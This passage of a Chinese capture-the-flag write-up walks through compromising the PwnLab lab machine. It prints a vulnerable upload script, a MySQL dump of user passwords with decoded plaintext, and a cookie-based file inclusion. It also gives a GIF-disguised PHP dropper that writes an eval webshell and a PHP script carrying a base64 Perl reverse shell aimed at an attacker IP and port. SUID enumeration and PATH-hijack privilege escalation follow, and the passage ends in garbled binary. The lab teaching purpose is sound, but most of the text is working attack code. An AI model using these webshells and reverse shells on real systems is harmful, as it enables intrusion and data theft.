class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123; <span class="keyword">die</span>(<span class="string">&#x27;You must be log in.&#x27;</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;post&#x27;</span> enctype=<span class="string">&#x27;multipart/form-data&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;file&#x27;</span> name=<span class="string">&#x27;file&#x27;</span> id=<span class="string">&#x27;file&#x27;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;Upload&#x27;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$filename</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="variable">$filetype</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">		<span class="variable">$uploaddir</span> = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">		<span class="variable">$file_ext</span>  = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageinfo</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.png&quot;</span>); </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$whitelist</span>))) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filetype</span>,<span class="string">&#x27;image&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 001&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 002&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$filetype</span>, <span class="string">&#x27;/&#x27;</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 003&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])).<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$uploadfile</span>.<span class="string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 4&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来的思路就变成了登录mysql,把登录密码dump出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>uroot <span class="operator">-</span>h <span class="number">172.17</span><span class="number">.135</span><span class="number">.71</span> <span class="operator">-</span>p</span><br><span class="line"></span><br><span class="line">Enter password: </span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL connection id <span class="keyword">is</span> <span class="number">23929</span></span><br><span class="line">Server version: <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="operator">+</span>deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2019</span>, Oracle <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its affiliates. <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> Oracle Corporation <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> help. Type <span class="string">&#x27;\c&#x27;</span> <span class="keyword">to</span> clear the <span class="keyword">current</span> input statement.</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> use Users;</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> pass             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="operator">|</span> kent <span class="operator">|</span> Sld6WHVCSkpOeQ<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mike <span class="operator">|</span> U0lmZHNURW42SQ<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> kane <span class="operator">|</span> aVN2NVltMkdSbw<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">kent JWzXuBJJNy</span><br><span class="line">mike SIfdsTEn6I</span><br><span class="line">kane iSv5Ym2GRo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登陆后 上传文件, 限制太严格,无法上传 审计代码后发现,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a target="_blank" rel="noopener" href="https://vulners.com/static/appercut/en/Php/InjectionFileInclusion.html">参考资料</a><p></p><p>写一个用于写出木马文件的木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;divint3.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$ma</span>=<span class="string">&quot;&lt;?php  @eval(<span class="subst">$_POST</span>[divint3]); ?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$ma</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure><p>由于不知道木马写到哪里去了,失败了 使用小马 文件上传位置<strong>upload/068ae40523a24c9ef54edefd375e542d.gif</strong> 配置蚁剑 登陆成功,发现文件divint3.php,但是根目录下的<strong>divint3.php</strong>内容不是我定义的内容,存疑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a  	<span class="comment">#发行版本</span></span><br><span class="line">getconf GNU_LIBC_VERSION <span class="comment">#glibc版本</span></span><br><span class="line">glibc 2.19</span><br></pre></td></tr></table></figure><p>使用pt_chown提权,无效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">env</span><br><span class="line">set</span><br><span class="line">export</span><br></pre></td></tr></table></figure><p></p><p>shell 反弹脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;10.160.108.146&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&quot;2333&quot;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>先查看可用shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br></pre></td></tr></table></figure><p></p><p>在nologin中使用nc弹shell,反弹回来的是nologin,使用<code>python -c "import pty;pty.spawn('/bin/rbash')"</code>得到交互式shell</p><p>su 到<code>kane iSv5Ym2GRo</code>,登陆成功 得到假flag<code>flag&#123;T5566Y&#125;</code></p><p>查看<code>.bash_history</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line">uid</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./222.sh</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /hmoe</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /mike</span><br><span class="line"><span class="built_in">cat</span> mike</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt;&gt; 222.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 222.sh</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./222.sh</span><br><span class="line"><span class="built_in">echo</span> `/bin/sh`</span><br><span class="line"><span class="built_in">export</span> PATH=./:<span class="variable">$PATH</span></span><br><span class="line">./msgike</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">./msgmike</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./msgmike</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次检查suid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:/home$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/home/kane/msgmike</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>发现msgmike有suid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 40</span><br><span class="line">drwxr-x--- 2 kane kane 4096 May 26 03:19 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 17  2016 ..</span><br><span class="line">-rw------- 1 kane kane  244 Apr 25 09:53 .bash_history</span><br><span class="line">-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwxrwxrwx 1 kane kane   10 May 21 09:56 <span class="built_in">cat</span></span><br><span class="line">-rw-r--r-- 1 root root   13 Apr 25 10:32 flag_wrong.txt</span><br><span class="line">-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike</span><br><span class="line">-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile</span><br></pre></td></tr></table></figure><p></p><p>粗略分析msgmike</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ELF`4l4(44444@@@@@ $LLL锟斤拷HHHDDP锟絫dXXX,,Q锟絫d/lib/ld-linux.so.2GNU GNU锟斤拷锟�3锟終锟絫g没锟斤拷&#125;雸砮  锟終锟斤拷,E #3鈻�</span><br><span class="line">T4DHLPTS锟斤拷锟斤拷锟絎锟斤拷锟斤拷锟斤拷锟斤拷t锟�*锟絒锟斤拷5&lt;锟�%@锟�%Dh锟斤拷锟斤拷锟斤拷%H锟斤拷锟斤拷锟斤拷%Lh锟斤拷锟斤拷锟斤拷%Ph鈻掞拷锟斤拷锟斤拷锟�%Th 锟斤拷锟斤拷锟�1锟絕锟斤拷锟斤拷锟絇TRh 